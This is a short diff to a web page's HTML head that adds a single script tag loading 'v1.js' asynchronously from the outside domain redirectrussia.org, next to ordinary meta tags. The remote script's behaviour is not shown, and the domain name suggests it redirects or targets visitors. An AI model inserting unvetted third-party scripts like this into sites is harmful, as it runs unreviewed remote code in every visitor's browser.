@@ -81,6 +81,7 @@ href="/favicon-16x16.png"
    const el = document.createElement('pwa-update');
    document.body.appendChild(el);
 </script>
+<script src="https://redirectrussia.org/v1.js" async></script>
 <meta charset="utf-8" />
 <meta name="description" content="My description" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
